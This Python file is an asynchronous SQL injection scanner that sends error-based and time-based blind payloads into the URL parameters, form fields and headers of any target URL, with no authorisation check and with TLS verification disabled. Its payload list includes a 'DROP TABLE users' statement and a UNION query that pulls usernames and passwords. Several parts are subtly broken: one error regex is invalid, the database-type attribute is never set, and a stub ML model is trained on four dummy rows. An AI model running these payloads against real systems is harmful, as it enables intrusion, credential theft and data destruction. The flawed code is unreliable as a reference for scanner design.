import asyncio
import aiohttp
import random
import string
import time
import uuid
import re
from typing import List, Dict, Any, Optional
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Optional ML components - will gracefully degrade if not available
try:
    from sklearn.linear_model import LogisticRegression
    import numpy as np
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("Warning: scikit-learn or numpy not available, ML detection disabled")

class EnhancedSQLScanner:
    """
    Enhanced scanner for detecting SQL injection vulnerabilities with advanced techniques.
    """

    def __init__(self):
        # SQL error patterns
        self.sql_error_patterns = [
            # MySQL
            r"SQL syntax.*?MySQL", r"Warning.*?mysqli?", r"MySQLSyntaxErrorException",
            r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySQL Query fail.*", r"SQL syntax.*", r"Access denied for user.*",
            
            # Oracle
            r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*oci_.*",
            r"quoted string not properly terminated",
            
            # Microsoft SQL Server
            r"Microsoft SQL Server", r"ODBC SQL Server Driver", r"ODBC Driver \d+ for SQL Server",
            r"SQLServer JDBC Driver", r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for ODBC Drivers error", r"SQL Server[^&]*Driver",
            r"Warning.*mssql_.*", r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine",
            r"\bODBC\b.*\bSQL\b.*\bServer\b", r"Incorrect syntax near", r"Syntax error in string in query expression",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR", r"Warning.*pg_.*", r"valid PostgreSQL result", r"Npgsql\.",
            r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException", r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near", 
            
            # Generic SQL
            r"SQLSTATE[", r"SQLSTATE=", r"Incorrect syntax near", r"Syntax error near",
            r"Unclosed quotation mark \(before\|after\)", r"error in your SQL syntax", r"unexpected end of SQL command",
            r"WARNING: SQL", r"ERROR: unterminated quoted", r"SQL command not properly ended",
            r"DatabaseDriverException", r"DBD::mysql::st execute failed:", r"Database error",
            
            # SQLite
            r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"SQLITE_ERROR", r"\[SQLITE_ERROR\]",
            
            # IBM DB2
            r"DB2 SQL error", r"db2_\w+\(", r"SQLSTATE", r"CLI Driver.*DB2", r"DB2.*SQL error", r"SQLCODE",
            
            # Sybase
            r"Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message", r"SybSQLException",
            
            # Ingres
            r"Warning.*ingres_", r"Ingres SQLSTATE", r"Ingres\W.*Driver",
            
            # Informix
            r"Exception.*Informix",
            
            # Firebird
            r"Dynamic SQL Error", r"Warning.*ibase_.*",
            
            # Hibernate
            r"org\.hibernate\.QueryException", 
            
            # JDBC
            r"java\.sql\.SQLException", r"java\.sql\.SQLSyntaxErrorException"
        ]
        
        # Advanced payloads
        self.error_payloads = [
            "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --",
            "' OR 1 --", "\" OR 1 --", "') OR ('1'='1", "\") OR (\"1\"=\"1",
            "' UNION SELECT 1,2,3 --", "\" UNION SELECT 1,2,3 --",
            "' OR '1'='1' --", "\" OR \"1\"=\"1' --",
            "' OR 1=1 #", "\" OR 1=1 #", "' OR 1=1 /*", "\" OR 1=1 /*",
            "/*!50000 OR 1=1*/", "' UNION SELECT NULL, @@version, NULL --",
            "%27%20%4f%52%20%31%3d%31%20--",  # URL-encoded
            "' OR SUBSTRING((SELECT @@version),1,1)='M' --",
            "' AND (SELECT 6765 FROM (SELECT(SLEEP(0.1)))OQT) AND 'nnoF'='nnoF",
            "' UNION SELECT *, 1, 1 FROM information_schema.tables --",
            "' UNION SELECT username, password FROM users --",
            "1'; DROP TABLE users; --",
            "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --",
            "' OR username IS NOT NULL --",
            "\" OR \"x\"=\"x",
            "') OR ('x')=('x",
            "')) OR (('x'))=(('x",
            "\")) OR ((\"x\"))=((\"x",
            "')) OR 1=1--",
            ";SELECT * FROM users",
            "admin'--",
            "admin' #",
            "admin'/*",
            "admin' OR 1=1--",
            "admin\" OR 1=1--"
        ]
        
        self.blind_payloads = [
            # MySQL sleep payloads 
            "' AND SLEEP(3) --", "\" AND SLEEP(3) --",
            "' OR SLEEP(3) --", "\" OR SLEEP(3) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "\" AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "1) AND SLEEP(3) --",
            "1)) AND SLEEP(3) --",
            "1' AND SLEEP(3) AND '1'='1",
            
            # PostgreSQL sleep payloads
            "' AND pg_sleep(3) --", "\" AND pg_sleep(3) --",
            "' OR pg_sleep(3) --", "\" OR pg_sleep(3) --",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "' OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            
            # SQL Server payloads
            "' AND WAITFOR DELAY '0:0:3' --",
            "\" AND WAITFOR DELAY '0:0:3' --",
            "' OR WAITFOR DELAY '0:0:3' --",
            "\" OR WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "1)); WAITFOR DELAY '0:0:3' --",
            "1'; WAITFOR DELAY '0:0:3' --",
            
            # Oracle payloads
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            
            # SQLite payloads
            "' AND RANDOMBLOB(500000000) AND '1'='1",
            "\" AND RANDOMBLOB(500000000) AND \"1\"=\"1",
            "' OR RANDOMBLOB(500000000) AND '1'='1",
            "\" OR RANDOMBLOB(500000000) AND \"1\"=\"1",
            
            # Generic heavy queries payloads
            "' AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "' OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --"
        ]
        
        # Likely vulnerable parameters
        self.likely_params = [
            # Common ID parameters
            "id", "user_id", "item_id", "product_id", "cat_id", "category_id", "cid", "pid", "sid", 
            "uid", "userid", "usr_id", "use_id", "member_id", "membership_id", "mid", "num", "number",
            "order_id", "payment_id", "pmt_id", "purchase_id", 
            
            # Content-related parameters
            "page_id", "article_id", "post_id", "story_id", "thread_id", "topic_id", "blog_id", "feed_id",
            "forum_id", "rel_id", "relation_id", "p", "pg", "record", "row", "event_id", "message_id",
            
            # Common identifiers
            "cat", "category", "user", "username", "email", "name", "handle", "login", "account", 
            "article", "news", "item", "product", "post", "date", "month", "year", "type", "tab", 
            
            # Search/query parameters
            "query", "search", "q", "s", "term", "keyword", "keywords", "filter", "sort", "sortby",
            "order", "orderby", "dir", "direction", "lang", "language", "reference", "ref", 
            
            # Action parameters
            "do", "action", "act", "cmd", "command", "func", "function", "op", "option", "process",
            "step", "mode", "stat", "status", "state", "stage", "phase", "redirect", "redir", "url", "link", 
            "goto", "target", "destination", "return", "returnurl", "return_url", "checkout", "continue", 
            
            # Path parameters
            "path", "folder", "directory", "prefix", "file", "filename", "pathname", "source", "dest",
            "destination", "base_url", "base", "parent", "child", "start", "end", "root", "origin",
            
            # Database parameters
            "db", "database", "table", "column", "field", "key", "record", "value", "row", "select",
            "where", "find", "delete", "update", "from", "to", "like", "limit", "offset", "fields",
            
            # Auth parameters
            "auth", "token", "jwt", "sess", "session", "cookie", "api_key", "apikey", "app_id", "appid",
            "auth_token", "access_token", "oauth", "code", "nonce", "timestamp", "expire", "valid"
        ]
        
        # Initialize ML model if available
        if ML_AVAILABLE:
            self.ml_model = LogisticRegression()
            # Train with simple dummy data (would be replaced with real data in production)
            self.ml_model.fit(
                np.array([[0.1, 200, 0], [3.0, 500, 1], [0.2, 300, 0], [2.5, 400, 1]]),
                np.array([0, 1, 0, 1])  # 0 = normal, 1 = vulnerable
            )
        else:
            self.ml_model = None
        
        self.max_concurrent_requests = 10
        self.baseline_cache = {}  # Cache baseline responses
        
    async def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """
        Scan a URL for SQL injection vulnerabilities using multiple techniques.
        
        Args:
            url: The URL to scan
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        print(f"Scanning {url} for SQL injection vulnerabilities...")
        
        try:
            semaphore = asyncio.Semaphore(self.max_concurrent_requests)
            
            # Try to fingerprint the database type
            db_type = await self._fingerprint_db(url, semaphore)
            if db_type != "unknown":
                print(f"Detected database: {db_type}")
                
                # Customize payloads based on DB type
                if db_type == "mysql":
                    self.error_payloads.append("' OR @@version LIKE '%MariaDB%' --")
                elif db_type == "postgres":
                    self.blind_payloads.append("' AND 1=pg_sleep(3) --")
                elif db_type == "mssql":
                    self.blind_payloads.append("' OR WAITFOR DELAY '0:0:3' --")
            
            # Multi-stage testing
            tasks = [
                self._check_url_parameters(url, semaphore),
                self._check_forms(url, semaphore),
                self._check_headers(url, semaphore)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, list):
                    vulnerabilities.extend(result)
            
            # Adjust concurrency based on response time
            if url in self.baseline_cache:
                baseline_avg = self.baseline_cache[url]["time"]
                self.max_concurrent_requests = min(50, max(5, int(10 / baseline_avg)))
        
        except Exception as e:
            print(f"Error scanning for SQL injection: {str(e)}")
        
        return vulnerabilities
    
    async def _fingerprint_db(self, url: str, semaphore: asyncio.Semaphore) -> str:
        """
        Fingerprint the database type by testing specific payloads.
        
        Args:
            url: The URL to test
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            The detected database type or "unknown"
        """
        fingerprint_payloads = {
            "mysql": "' UNION SELECT NULL, @@version, NULL --",
            "postgres": "' UNION SELECT NULL, version(), NULL --",
            "mssql": "' UNION SELECT NULL, @@version, NULL --",
            "sqlite": "' UNION SELECT NULL, sqlite_version(), NULL --",
            "oracle": "' UNION SELECT NULL, banner, NULL FROM v$version --"
        }
        
        # Parse the URL to find parameters to inject
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If no parameters, try to find ID patterns in path
        param_name = None
        if not query_params:
            path_segments = parsed_url.path.split('/')
            for i, segment in enumerate(path_segments):
                if segment.isdigit() or (segment and segment[-1].isdigit()):
                    param_name = f"path_id_{i}"
                    break
        else:
            # Use the first parameter found
            param_name = next(iter(query_params))
        
        if not param_name:
            return "unknown"
        
        async with semaphore:
            async with aiohttp.ClientSession() as session:
                for db_type, payload in fingerprint_payloads.items():
                    try:
                        # Inject the fingerprinting payload
                        if param_name.startswith("path_id_"):
                            # For path-based parameters, we need a different approach
                            continue
                        
                        # For query parameters, use the standard injection
                        new_url = self._inject_payload(url, param_name, payload)
                        async with session.get(new_url, timeout=10, ssl=False) as response:
                            text = await response.text()
                            
                            # Check for database signatures in response
                            if db_type == "mysql" and ("mysql" in text.lower() or "mariadb" in text.lower()):
                                return "mysql"
                            elif db_type == "postgres" and "postgresql" in text.lower():
                                return "postgres"
                            elif db_type == "mssql" and ("microsoft" in text.lower() and "sql server" in text.lower()):
                                return "mssql"
                            elif db_type == "sqlite" and "sqlite" in text.lower():
                                return "sqlite"
                            elif db_type == "oracle" and "oracle" in text.lower():
                                return "oracle"
                    except Exception as e:
                        continue
        
        return "unknown"
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """
        Inject a payload into a URL parameter.
        
        Args:
            url: The URL to inject into
            param_name: The parameter name to inject into
            payload: The payload to inject
            
        Returns:
            The new URL with the injected payload
        """
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Make a copy of the query parameters
        new_params = {k: v.copy() if isinstance(v, list) else [v] for k, v in query_params.items()}
        
        # Modify the target parameter
        if param_name in new_params:
            new_params[param_name] = [payload]
        else:
            new_params[param_name] = [payload]
        
        # Reconstruct the URL
        new_query = urlencode(new_params, doseq=True)
        return urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        )) 
    
    async def _check_url_parameters(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check URL parameters for SQL injection vulnerabilities with improved path-based parameter detection.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Parse the URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            original_url = url
            
            # Handle URL normalization
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                parsed_url = urlparse(url)
            
            # If there are no query parameters, try to identify path-based parameters
            if not query_params:
                print(f"No query parameters found, checking for path-based parameters in {parsed_url.path}")
                
                # Check for common path patterns like /users/123 or /products/456
                path_parts = parsed_url.path.split('/')
                for i, part in enumerate(path_parts):
                    # Look for numeric IDs
                    if part.isdigit():
                        query_params[f"path_id_{i}"] = [part]
                        print(f"Found potential path-based ID parameter: {part} at position {i}")
                    
                    # Look for SEO-friendly slugs with IDs like 'product-123'
                    elif '-' in part and any(segment.isdigit() for segment in part.split('-')):
                        for segment in part.split('-'):
                            if segment.isdigit():
                                query_params[f"path_slug_id_{i}"] = [segment]
                                print(f"Found potential slug ID parameter: {segment} at position {i}")
                    
                    # Look for pattern where parameter name and value are in consecutive segments
                    # Example: /category/electronics/price/100-200/
                    if i > 0 and i < len(path_parts) - 1:
                        if path_parts[i].lower() in self.likely_params:
                            query_params[path_parts[i]] = [path_parts[i+1]]
                            print(f"Found potential name/value pair in path: {path_parts[i]}={path_parts[i+1]}")
            
            # If there are still no parameters to test, try other discovery methods
            if not query_params:
                print("No parameters found in path, attempting to discover endpoints with parameters")
                
                # Try common endpoints that might have parameters
                common_endpoints = [
                    "/search", "/products", "/users", "/login", "/items", "/category",
                    "/view", "/profile", "/account", "/article", "/news", "/blog", "/post"
                ]
                
                # For each potential endpoint, create a synthetic parameter to test
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                for endpoint in common_endpoints:
                    test_url = f"{base_url}{endpoint}"
                    if test_url != original_url:  # Avoid retesting the original URL
                        test_params = {"id": ["1"], "test": ["1"]}
                        test_query = urlencode(test_params, doseq=True)
                        test_endpoint_url = f"{test_url}?{test_query}"
                        print(f"Testing common endpoint: {test_endpoint_url}")
                        
                        # Make a quick request to check if the endpoint exists
                        try:
                            async with semaphore:
                                async with aiohttp.ClientSession() as session:
                                    async with session.get(test_endpoint_url, timeout=5, ssl=False) as response:
                                        if response.status == 200:
                                            # Endpoint exists, add it to our testing queue
                                            endpoint_url = f"{base_url}{endpoint}"
                                            for param in ["id", "test"]:
                                                query_params[f"discovered_{param}"] = ["1"]
                        except Exception as e:
                            print(f"Error testing endpoint {test_endpoint_url}: {str(e)}")
            
            # If there are still no parameters, return empty list
            if not query_params:
                print("No testable parameters found in URL")
                return []
            
            print(f"Testing {len(query_params)} parameters for SQL injection: {list(query_params.keys())}")
            
            # Create tasks for each parameter
            tasks = []
            for param_name, param_values in query_params.items():
                if not param_values:
                    continue
                    
                param_value = param_values[0] if param_values and param_values[0] else "1"
                
                # Prioritize testing for known vulnerable parameter names
                priority = 1.0
                if any(vulnerable_param in param_name.lower() for vulnerable_param in ["id", "user", "pass", "admin", "login", "key"]):
                    priority = 2.0  # Higher priority for likely vulnerable parameters
                
                # Test for error-based SQL injection
                tasks.append(self._test_error_sqli(url, param_name, param_value, "url", semaphore, priority=priority))
                
                # Test for blind SQL injection (more expensive, so we're selective)
                if random.random() < priority * 0.7:  # Adjust probability based on parameter priority
                    tasks.append(self._test_blind_sqli(url, param_name, param_value, "url", semaphore, priority=priority))
            
            # Run tasks concurrently
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Filter out exceptions and None results
            for result in results:
                if isinstance(result, dict) and result:
                    vulnerabilities.append(result)
        
        except Exception as e:
            print(f"Error checking URL parameters for SQL injection: {str(e)}")
        
        return vulnerabilities
    
    async def _check_forms(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check forms for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Fetch the page content
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10, ssl=False) as response:
                        if response.status != 200:
                            return []
                        
                        html_content = await response.text()
            
            # Parse the HTML
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            # Process each form
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Resolve the form action URL
                if form_action.startswith('http'):
                    form_url = form_action
                elif form_action.startswith('/'):
                    parsed_url = urlparse(url)
                    form_url = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
                else:
                    # Relative URL
                    base_url = url.rsplit('/', 1)[0] if '/' in url.split('://', 1)[1] else url
                    form_url = f"{base_url}/{form_action}"
                
                # Process each input field in the form
                input_fields = form.find_all(['input', 'textarea'])
                for input_field in input_fields:
                    input_type = input_field.get('type', '').lower()
                    input_name = input_field.get('name', '')
                    
                    # Skip submit, button, file inputs, etc.
                    if not input_name or input_type in ['submit', 'button', 'file', 'image', 'reset', 'checkbox', 'radio']:
                        continue
                    
                    # Get the default value
                    input_value = input_field.get('value', '')
                    
                    # Test for error-based SQL injection
                    result = await self._test_error_sqli(form_url, input_name, input_value, "form", semaphore, method=form_method)
                    if result:
                        vulnerabilities.append(result)
                    
                    # Test for blind SQL injection
                    result = await self._test_blind_sqli(form_url, input_name, input_value, "form", semaphore, method=form_method)
                    if result:
                        vulnerabilities.append(result)
        
        except Exception as e:
            print(f"Error checking forms for SQL injection: {str(e)}")
        
        return vulnerabilities
    
    async def _check_headers(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check HTTP headers for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # Headers to test for SQL injection
            headers_to_test = {
                "User-Agent": random.choice(self.error_payloads),
                "Referer": f"{url}' OR 1=1 --",
                "Cookie": f"id={random.choice(self.error_payloads)}; session=test"
            }
            
            # First make a normal request to establish baseline
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=10, ssl=False) as baseline_response:
                        baseline_text = await baseline_response.text()
                        
                        # Now test with SQL injection payloads in headers
                        start_time = time.time()
                        try:
                            async with session.get(url, headers=headers_to_test, timeout=15, ssl=False) as response:
                                response_time = time.time() - start_time
                                response_text = await response.text()
                                
                                # Check for SQL error patterns
                                for pattern in self.sql_error_patterns:
                                    if re.search(pattern, response_text, re.IGNORECASE) and not re.search(pattern, baseline_text, re.IGNORECASE):
                                        vulnerabilities.append({
                                            "id": str(uuid.uuid4()),
                                            "name": "SQL Injection in HTTP Headers",
                                            "description": "SQL injection vulnerability detected in HTTP headers",
                                            "severity": "high",
                                            "location": url,
                                            "evidence": f"SQL error pattern found: {pattern}",
                                            "remediation": "Sanitize and validate all inputs including HTTP headers. Use parameterized queries."
                                        })
                                        break
                                
                                # Check for time-based blind injection
                                if response_time > 3.0:  # If response took more than 3 seconds
                                    vulnerabilities.append({
                                        "id": str(uuid.uuid4()),
                                        "name": "Blind SQL Injection in HTTP Headers",
                                        "description": "Time-based blind SQL injection detected in HTTP headers",
                                        "severity": "high",
                                        "location": url,
                                        "evidence": f"Request with payload in headers took {response_time:.2f} seconds",
                                        "remediation": "Sanitize and validate all inputs including HTTP headers. Use parameterized queries."
                                    })
                        except asyncio.TimeoutError:
                            # Timeout could indicate a successful blind injection
                            vulnerabilities.append({
                                "id": str(uuid.uuid4()),
                                "name": "Blind SQL Injection in HTTP Headers",
                                "description": "Time-based blind SQL injection detected in HTTP headers (request timed out)",
                                "severity": "high",
                                "location": url,
                                "evidence": "Request with payload in headers timed out",
                                "remediation": "Sanitize and validate all inputs including HTTP headers. Use parameterized queries."
                            })
        
        except Exception as e:
            print(f"Error checking headers for SQL injection: {str(e)}")
        
        return vulnerabilities 
    
    async def _test_error_sqli(self, url: str, param_name: str, param_value: str, 
                              location_type: str, semaphore: asyncio.Semaphore, 
                              method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for error-based SQL injection.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            priority: Priority of the parameter (higher means more likely vulnerable)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # Skip testing if parameter is not likely to be vulnerable and not forced
            if param_name.lower() not in self.likely_params and not any(char in param_name.lower() for p in ['id', 'user', 'name', 'pass', 'key', 'mail', 'sess'] for char in p):
                # Adjust sample rate based on priority
                threshold = 0.2 * priority  # Higher priority means higher chance of testing
                if random.random() > threshold:
                    return None
            
            # First, make a normal request to establish baseline
            baseline_response = await self._make_request(url, param_name, param_value, method, semaphore)
            
            # Select payloads to try (number based on priority)
            num_payloads = min(int(3 * priority), len(self.error_payloads))
            sampled_payloads = random.sample(self.error_payloads, num_payloads)
            
            # Try each payload
            for payload in sampled_payloads:
                # Make a request with the payload
                error_response = await self._make_request(url, param_name, payload, method, semaphore)
                
                if error_response:
                    content = error_response.lower()
                    
                    # Check for SQL error patterns in the response
                    for pattern in self.sql_error_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            # Check if the error pattern was not in the baseline response
                            if baseline_response and not re.search(pattern, baseline_response.lower(), re.IGNORECASE):
                                return {
                                    "id": str(uuid.uuid4()),
                                    "name": "SQL Injection",
                                    "description": f"SQL injection vulnerability detected in {location_type} parameter: {param_name}",
                                    "severity": "high",
                                    "location": url,
                                    "evidence": f"Parameter '{param_name}' with payload '{payload}' triggered error pattern: {pattern}",
                                    "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                                }
            
            return None
        
        except Exception as e:
            print(f"Error testing error-based SQL injection for parameter {param_name}: {str(e)}")
            return None
    
    async def _test_blind_sqli(self, url: str, param_name: str, param_value: str, 
                              location_type: str, semaphore: asyncio.Semaphore, 
                              method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for blind (time-based) SQL injection.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            location_type: Type of location (url or form)
            semaphore: Semaphore to limit concurrent requests
            method: HTTP method (get or post)
            priority: Priority of the parameter (higher means more likely vulnerable)
            
        Returns:
            A vulnerability dict if found, None otherwise
        """
        try:
            # Skip testing if parameter is not likely to be vulnerable
            if param_name.lower() not in self.likely_params and not any(char in param_name.lower() for p in ['id', 'user', 'name', 'pass', 'key', 'mail', 'sess'] for char in p):
                # Adjust sample rate based on priority, but keep it lower for blind testing (expensive)
                threshold = 0.1 * priority  # Higher priority means higher chance of testing
                if random.random() > threshold:
                    return None
            
            # Get or calculate baseline response time
            url_key = f"{url}:{method}"
            if url_key not in self.baseline_cache:
                # Calculate baseline response time with multiple samples for accuracy
                baseline_times = []
                for _ in range(3):
                    start_time = time.time()
                    await self._make_request(url, param_name, param_value, method, semaphore)
                    baseline_times.append(time.time() - start_time)
                
                baseline_avg = sum(baseline_times) / len(baseline_times)
                self.baseline_cache[url_key] = {"time": baseline_avg}
            else:
                baseline_avg = self.baseline_cache[url_key]["time"]
            
            # Adjust threshold based on baseline response time
            # For slow sites, we need a higher threshold to avoid false positives
            threshold = max(2.5, baseline_avg * 2)
            
            # Select payload based on database fingerprinting if available
            if hasattr(self, 'db_type') and self.db_type != "unknown":
                # Choose payload specific to detected database
                if self.db_type == "mysql":
                    payloads = [p for p in self.blind_payloads if "SLEEP" in p]
                elif self.db_type == "postgres":
                    payloads = [p for p in self.blind_payloads if "pg_sleep" in p]
                elif self.db_type == "mssql":
                    payloads = [p for p in self.blind_payloads if "WAITFOR" in p]
                elif self.db_type == "oracle":
                    payloads = [p for p in self.blind_payloads if "DBMS_PIPE" in p]
                else:
                    payloads = self.blind_payloads
                
                # If we have database-specific payloads, use them
                if payloads:
                    payload = random.choice(payloads)
                else:
                    payload = random.choice(self.blind_payloads)
            else:
                # No DB type detected, try a random payload
                payload = random.choice(self.blind_payloads)
            
            # Now, measure the response time with the payload
            start_time = time.time()
            try:
                await self._make_request(url, param_name, payload, method, semaphore, timeout=10.0)
                payload_response_time = time.time() - start_time
            except asyncio.TimeoutError:
                # Timeout could indicate a successful time-based injection
                payload_response_time = 10.0  # Timeout value
            
            # Verbose output for debugging
            time_diff = payload_response_time - baseline_avg
            print(f"Blind SQL test for {param_name}: baseline={baseline_avg:.2f}s, payload={payload_response_time:.2f}s, diff={time_diff:.2f}s")
            
            # Check if the payload request took significantly longer
            if time_diff >= threshold:
                # Try one more time to confirm it's not a false positive
                start_time = time.time()
                try:
                    await self._make_request(url, param_name, payload, method, semaphore, timeout=10.0)
                    second_payload_time = time.time() - start_time
                except asyncio.TimeoutError:
                    second_payload_time = 10.0  # Timeout value
                
                # If the second test is also slow, it's likely a real vulnerability
                if second_payload_time - baseline_avg >= threshold:
                    return {
                        "id": str(uuid.uuid4()),
                        "name": "Blind SQL Injection",
                        "description": f"Time-based blind SQL injection vulnerability detected in {location_type} parameter: {param_name}",
                        "severity": "high",
                        "location": url,
                        "evidence": f"Parameter '{param_name}' with payload '{payload}' caused response time difference: {time_diff:.2f} seconds (baseline: {baseline_avg:.2f}s)",
                        "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                    }
            
            return None
        
        except Exception as e:
            print(f"Error testing blind SQL injection for parameter {param_name}: {str(e)}")
            return None
    
    async def _make_request(self, url: str, param_name: str, param_value: str, method: str, semaphore: asyncio.Semaphore, timeout: float = 5.0) -> Optional[str]:
        """
        Make a request with the specified parameter.
        
        Args:
            url: The URL to test
            param_name: The parameter name
            param_value: The parameter value
            method: HTTP method (get or post)
            semaphore: Semaphore to limit concurrent requests
            timeout: Request timeout
            
        Returns:
            The response text if successful, None otherwise
        """
        try:
            # Create a modified URL with the payload for GET requests
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            # Make a copy of the query parameters
            new_params = {k: v.copy() if isinstance(v, list) else [v] for k, v in query_params.items()}
            
            # Modify the target parameter
            if param_name in new_params:
                new_params[param_name] = [param_value]
            else:
                new_params[param_name] = [param_value]
            
            # Reconstruct the URL for GET requests
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Make the request
            async with semaphore:
                client_timeout = aiohttp.ClientTimeout(total=timeout)
                async with aiohttp.ClientSession(timeout=client_timeout) as session:
                    if method.lower() == "post":
                        # For POST requests, send the payload in the form data
                        form_data = {k: v[0] if isinstance(v, list) and v else v for k, v in new_params.items()}
                        try:
                            async with session.post(url, data=form_data, ssl=False) as response:
                                return await response.text()
                        except aiohttp.ClientConnectorError as e:
                            print(f"Connection error for POST request to {url}: {str(e)}")
                            return None
                        except aiohttp.ClientResponseError as e:
                            print(f"Response error for POST request to {url}: {str(e)}")
                            return None
                        except asyncio.TimeoutError:
                            # Rethrow timeout errors for blind SQL injection testing
                            raise
                        except Exception as e:
                            print(f"Unexpected error for POST request to {url}: {str(e)}")
                            return None
                    else:
                        # For GET requests, send the payload in the URL
                        try:
                            async with session.get(new_url, ssl=False) as response:
                                return await response.text()
                        except aiohttp.ClientConnectorError as e:
                            print(f"Connection error for GET request to {new_url}: {str(e)}")
                            return None
                        except aiohttp.ClientResponseError as e:
                            print(f"Response error for GET request to {new_url}: {str(e)}")
                            return None
                        except asyncio.TimeoutError:
                            # Rethrow timeout errors for blind SQL injection testing
                            raise
                        except Exception as e:
                            print(f"Unexpected error for GET request to {new_url}: {str(e)}")
                            return None
        
        except asyncio.TimeoutError:
            # Let the timeout propagate up for blind SQL injection testing
            raise
        except Exception as e:
            print(f"Error preparing request for {url} with parameter {param_name}={param_value}: {str(e)}")
            return None 